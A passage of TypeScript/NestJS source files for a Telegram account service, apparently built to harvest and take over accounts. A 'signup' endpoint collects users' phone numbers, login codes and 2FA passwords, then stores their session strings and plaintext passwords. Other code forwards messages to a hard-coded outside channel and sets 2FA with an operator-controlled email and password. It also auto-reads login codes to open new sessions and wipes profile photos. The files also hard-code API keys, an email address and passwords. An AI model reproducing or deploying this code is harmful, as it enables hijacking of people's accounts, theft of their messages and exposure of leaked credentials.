limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n\n\n    async forwardMessage(chatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(\"@fuckyoubabie\", { fromPeer: chatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code)\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n}\nexport default TelegramManager;\n","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            {\r\n                mobile: '+1234567890',\r\n                tgId: \"1234567890\"\r\n            }\r\n        ],\r\n    })\r\n    data: { mobile: string, tgId: string }[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactsDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            \"919892184284\", \"919967837841\", \"919972600626\",\r\n        ],\r\n    })\r\n    phoneNumbers: string[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { TgSignupService } from './TgSignup.service';\r\n\r\n@Module({\r\n    imports: [forwardRef(() => UsersModule)],\r\n    controllers: [TgSignupController],\r\n    providers: [TgSignupService],\r\n    exports: [TgSignupService]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\r\nimport { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { UsersService } from \"../users/users.service\";\r\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\r\nimport { fetchWithTimeout, parseError, ppplbot } from \"../../utils\";\r\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\r\n\r\ninterface ITelegramCredentials {\r\n    apiId: number;\r\n    apiHash: string;\r\n}\r\n\r\n@Injectable()\r\nexport class TgSignupService implements OnModuleDestroy {\r\n    private readonly logger = new Logger(TgSignupService.name);\r\n    private static readonly LOGIN_TIMEOUT = 150000; // 2.5 minutes\r\n    private static readonly SESSION_CLEANUP_INTERVAL = 120000; // 2 minutes\r\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\r\n    private readonly cleanupInterval: NodeJS.Timeout;\r\n\r\n    // Map to store active client sessions\r\n    private static readonly activeClients = new Map<string, {\r\n        client: TelegramClient;\r\n        phoneCodeHash: string;\r\n        timeoutId: NodeJS.Timeout;\r\n        createdAt: number;\r\n    }>();\r\n\r\n    // API credentials pool for load balancing with correct hashes\r\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\r\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\r\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\r\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\r\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\r\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\r\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\r\n    ];\r\n\r\n    constructor(private readonly usersService: UsersService) {\r\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\r\n    }\r\n\r\n    async onModuleDestroy() {\r\n        clearInterval(this.cleanupInterval);\r\n        // Cleanup all active sessions\r\n        const phones = Array.from(TgSignupService.activeClients.keys());\r\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\r\n    }\r\n\r\n    private getRandomCredentials(): ITelegramCredentials {\r\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\r\n        return TgSignupService.API_CREDENTIALS[index];\r\n    }\r\n\r\n    private async cleanupStaleSessions() {\r\n        for (const [phone, session] of TgSignupService.activeClients) {\r\n            try {\r\n                if (session.client && !session.client.connected) {\r\n                    await this.disconnectClient(phone);\r\n                }\r\n            } catch (error) {\r\n                this.logger.error(`Error cleaning up session for ${phone}: ${error.message}`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private validatePhoneNumber(phone: string): string {\r\n        // Remove any existing + prefix\r\n        phone = phone.replace(/^\\+/, '');\r\n\r\n        // Validate phone number format\r\n        if (!/^\\d{10,15}$/.test(phone)) {\r\n            throw new BadRequestException('Invalid phone number format');\r\n        }\r\n\r\n        return phone;\r\n    }\r\n\r\n    private async disconnectClient(phone: string): Promise<void> {\r\n        const session = TgSignupService.activeClients.get(phone);\r\n        if (session) {\r\n            try {\r\n                clearTimeout(session.timeoutId);\r\n                if (session.client?.connected) {\r\n                    await session.client.disconnect();\r\n                }\r\n                if (session.client) {\r\n                    await session.client.destroy();\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\r\n            } finally {\r\n                TgSignupService.activeClients.delete(phone);\r\n            }\r\n        }\r\n    }\r\n\r\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\r\n        try {\r\n            this.logger.debug(`Validating phone number: ${phone}`);\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            this.logger.debug(`Disconnecting any existing client for: ${phone}`);\r\n            await this.disconnectClient(phone);\r\n\r\n            this.logger.debug(`Fetching random credentials for API ID and API Hash`);\r\n            const { apiId, apiHash } = this.getRandomCredentials();\r\n            const session = new StringSession('');\r\n            const client = new TelegramClient(session, apiId, apiHash, {\r\n                connectionRetries: 5,\r\n                retryDelay: 2000,\r\n                useWSS: true,\r\n                timeout: 30000\r\n            });\r\n\r\n            this.logger.debug(`Setting log level to ERROR for TelegramClient`);\r\n            await client.setLogLevel(LogLevel.ERROR);\r\n\r\n            this.logger.debug(`Connecting to Telegram server`);\r\n            await client.connect();\r\n\r\n            this.logger.debug(`Invoking API to send code to: ${phone}`);\r\n            const sendResult = await client.invoke(\r\n                new Api.auth.SendCode({\r\n                    phoneNumber: phone,\r\n                    apiId,\r\n                    apiHash,\r\n                    settings: new Api.CodeSettings({\r\n                        currentNumber: true,\r\n                        allowAppHash: true,\r\n                    }),\r\n                })\r\n            );\r\n\r\n            this.logger.debug(`Received send code result for ${phone}: ${JSON.stringify(sendResult)}`);\r\n\r\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\r\n                this.logger.error(`Unexpected immediate login for ${phone}`);\r\n                throw new BadRequestException('Unexpected immediate login');\r\n            }\r\n\r\n            this.logger.debug(`Setting up session timeout for ${phone}`);\r\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            this.logger.debug(`Storing client session for ${phone}`);\r\n            TgSignupService.activeClients.set(phone, {\r\n                client,\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                timeoutId,\r\n                createdAt: Date.now()\r\n            });\r\n\r\n            return {\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            throw new BadRequestException(error.message || 'Failed to send verification code');\r\n        }\r\n    }\r\n\r\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Validating phone number for verification: ${phone}`);\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            this.logger.debug(`Fetching active session for ${phone}`);\r\n            const session = TgSignupService.activeClients.get(phone);\r\n            if (!session) {\r\n                this.logger.warn(`No active signup session found for ${phone}`);\r\n                throw new BadRequestException('No active signup session found. Please request a new code.');\r\n            }\r\n\r\n            this.logger.debug(`Checking session age for ${phone}`);\r\n            if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT) {\r\n                await this.disconnectClient(phone);\r\n                this.logger.warn(`Verification code expired for ${phone}`);\r\n                throw new BadRequestException('Verification code expired. Please request a new code.');\r\n            }\r\n\r\n            if (!session.client?.connected) {\r\n                await this.disconnectClient(phone);\r\n                this.logger.warn(`Client connection lost for ${phone}`);\r\n                throw new BadRequestException('Connection lost. Please request a new code.');\r\n            }\r\n\r\n            this.logger.debug(`Invoking SignIn API for ${phone}`);\r\n            const { client, phoneCodeHash } = session;\r\n\r\n            try {\r\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\r\n                const signInResult = await client.invoke(\r\n                    new Api.auth.SignIn({\r\n                        phoneNumber: phone,\r\n                        phoneCodeHash,\r\n                        phoneCode: code,\r\n                    })\r\n                ) as Api.auth.Authorization;\r\n\r\n                if (!signInResult) {\r\n                    throw new BadRequestException('Invalid response from Telegram server');\r\n                }\r\n\r\n                this.logger.debug(`SignIn result for ${phone}: ${JSON.stringify(signInResult)}`);\r\n\r\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                    this.logger.log(`New user registration required for ${phone}`);\r\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\r\n                    await this.disconnectClient(phone);\r\n                    return result;\r\n                }\r\n\r\n                // Store the session string before processing\r\n                const sessionString = client.session.save() as unknown as string;\r\n                if (!sessionString) {\r\n                    throw new Error('Failed to generate session string');\r\n                }\r\n\r\n                this.logger.log(`User login successful for ${phone}`);\r\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n                await this.disconnectClient(phone);\r\n                return userData;\r\n            } catch (error) {\r\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\r\n                    this.logger.warn(`2FA required for ${phone}`);\r\n                    if (!password) {\r\n                        return {\r\n                            status: 400,\r\n                            message: 'Two-factor authentication required',\r\n                            requires2FA: true\r\n                        };\r\n                    }\r\n                    return await this.handle2FALogin(phone, session.client, password);\r\n                }\r\n\r\n                throw error;\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Verification failed for ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            throw new BadRequestException(error.message || 'Verification failed');\r\n        }\r\n    }\r\n\r\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\r\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\r\n\r\n            this.logger.debug(`Computing password check for ${phone}`);\r\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\r\n\r\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\r\n            const signInResult = await client.invoke(\r\n                new Api.auth.CheckPassword({\r\n                    password: passwordCheck,\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signInResult || !signInResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            this.logger.log(`2FA login successful for ${phone}`);\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n            await this.disconnectClient(phone);\r\n            return userData;\r\n        } catch (error) {\r\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\r\n            if (password) {\r\n                throw new BadRequestException('Incorrect 2FA password');\r\n            }\r\n            throw new BadRequestException('2FA password required');\r\n        }\r\n    }\r\n\r\n    private async handleNewUserRegistration(\r\n        phone: string,\r\n        client: TelegramClient,\r\n        phoneCodeHash: string\r\n    ): Promise<TgSignupResponse> {\r\n        try {\r\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\r\n            const signUpResult = await client.invoke(\r\n                new Api.auth.SignUp({\r\n                    phoneNumber: phone,\r\n                    phoneCodeHash,\r\n                    firstName: randomName,\r\n                    lastName: '', // Keep empty for privacy\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signUpResult || !signUpResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            return await this.processLoginResult(signUpResult.user, sessionString);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error);\r\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\r\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\r\n        }\r\n    }\r\n\r\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            if (!user || !sessionString) {\r\n                throw new Error('Invalid user data or session string');\r\n            }\r\n\r\n            // Add additional user metadata\r\n            const now = new Date();\r\n            const userData: CreateUserDto = {\r\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\r\n                session: sessionString,\r\n                firstName: user.firstName || '',\r\n                lastName: user.lastName || '',\r\n                username: user.username || '',\r\n                tgId: user.id?.toString() || '',\r\n                twoFA: !!password,\r\n                password: password || null,\r\n                lastActive: now.toISOString().split('T')[0],\r\n                expired: false,\r\n                channels: 0,\r\n                personalChats: 0,\r\n                totalChats: 0,\r\n                otherPhotoCount: 0,\r\n                ownPhotoCount: 0,\r\n                ownVideoCount: 0,\r\n                otherVideoCount: 0,\r\n                recentUsers: [],\r\n                calls: {\r\n                    chatCallCounts: [],\r\n                    incoming: 0,\r\n                    outgoing: 0,\r\n                    totalCalls: 0,\r\n                    video: 0,\r\n                },\r\n                contacts: 0,\r\n                movieCount: 0,\r\n                msgs: 0,\r\n                photoCount: 0,\r\n                videoCount: 0,\r\n                gender: 'unknown',\r\n            };\r\n\r\n            // Validate required fields\r\n            if (!userData.mobile || !userData.tgId) {\r\n                throw new Error('Invalid user data received from Telegram');\r\n            }\r\n\r\n            await this.usersService.create(userData);\r\n\r\n            return {\r\n                status: 200,\r\n                message: 'Registration successful',\r\n                session: sessionString,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('Error processing login result:', error);\r\n            if (error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new InternalServerErrorException('Failed to complete registration');\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, BadRequestException, HttpException, UseGuards, Logger, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\r\nimport { TgSignupService } from './TgSignup.service';\r\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\r\nimport { parseError } from '../../utils';\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\n@UsePipes(new ValidationPipe({ \r\n    transform: true,\r\n    whitelist: true,\r\n    forbidNonWhitelisted: true,\r\n    transformOptions: { enableImplicitConversion: true }\r\n}))\r\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\r\nexport class TgSignupController {\r\n    private readonly logger = new Logger(TgSignupController.name);\r\n\r\n    constructor(private readonly tgSignupService: TgSignupService) {}\r\n\r\n    @Post('send-code')\r\n    @ApiOperation({ \r\n        summary: 'Send verification code to phone number',\r\n        description: 'Initiates the signup process by sending a verification code via Telegram'\r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.CREATED, \r\n        type: TgSignupResponse, \r\n        description: 'Code sent successfully' \r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.BAD_REQUEST, \r\n        description: 'Invalid phone number or failed to send code',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                statusCode: { type: 'number', example: 400 },\r\n                message: { type: 'string', example: 'Invalid phone number format' },\r\n                error: { type: 'string', example: 'Bad Request' }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.TOO_MANY_REQUESTS, \r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\r\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\r\n            \r\n            this.logger.debug(`[SEND_CODE] Success for phone: ${sendCodeDto.phone}`, { \r\n                isCodeViaApp: result.isCodeViaApp,\r\n                hasPhoneCodeHash: !!result.phoneCodeHash \r\n            });\r\n\r\n            return {\r\n                status: HttpStatus.CREATED,\r\n                message: 'Verification code sent successfully',\r\n                phoneCodeHash: result.phoneCodeHash,\r\n                isCodeViaApp: result.isCodeViaApp\r\n            };\r\n        } catch (error) {\r\n            const parsedError = parseError(error);\r\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\r\n                error: parsedError,\r\n                stack: error.stack,\r\n                errorType: error.constructor.name\r\n            });\r\n            \r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n            \r\n            throw new BadRequestException(parsedError.message || 'Failed to send verification code');\r\n        }\r\n    }\r\n\r\n    @Post('verify')\r\n    @ApiOperation({ \r\n        summary: 'Verify code and complete signup/login',\r\n        description: 'Verifies the code sent to phone and completes the signup/login process'\r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.OK, \r\n        type: TgSignupResponse, \r\n        description: 'Verification successful' \r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.BAD_REQUEST, \r\n        description: 'Invalid code or verification failed'\r\n    })\r\n    @ApiResponse({ \r\n        status: HttpStatus.TOO_MANY_REQUESTS, \r\n        description: 'Rate limit exceeded' \r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[VERIFY_CODE] Request received`, { \r\n                phone: verifyCodeDto.phone,\r\n                hasPassword: !!verifyCodeDto.password\r\n            });\r\n\r\n            const result = await this.tgSignupService.verifyCode(\r\n                verifyCodeDto.phone,\r\n                verifyCodeDto.code,\r\n                verifyCodeDto.password\r\n            );\r\n\r\n            this.logger.debug(`[VERIFY_CODE] Success for phone: ${verifyCodeDto.phone}`, { \r\n                status: result.status,\r\n                requires2FA: result.requires2FA,\r\n                hasSession: !!result.session\r\n            });\r\n\r\n            return {\r\n                status: HttpStatus.OK,\r\n                message: result.message,\r\n                session: result.session,\r\n                requires2FA: result.requires2FA\r\n            